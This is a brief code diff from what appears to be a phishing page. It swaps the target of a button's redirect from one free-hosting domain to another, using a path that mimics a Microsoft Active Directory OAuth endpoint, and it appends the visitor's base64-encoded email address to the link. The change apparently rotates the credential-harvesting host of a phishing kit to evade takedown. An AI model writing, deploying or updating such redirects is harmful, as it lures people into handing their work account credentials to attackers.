@@ -33,7 +33,7 @@
 
             // Set up the button click handler for redirection
             document.getElementById('redirectButton').onclick = function() {
-                let redirectLink = "https://activedirectorysharepoint-production.up.railway.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/";
+                let redirectLink = "https://activedirectory-aypebda8.b4a.run/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/";
 
                 if (decodedEmail) {
                     // Append the base64 encoded email to the redirect link
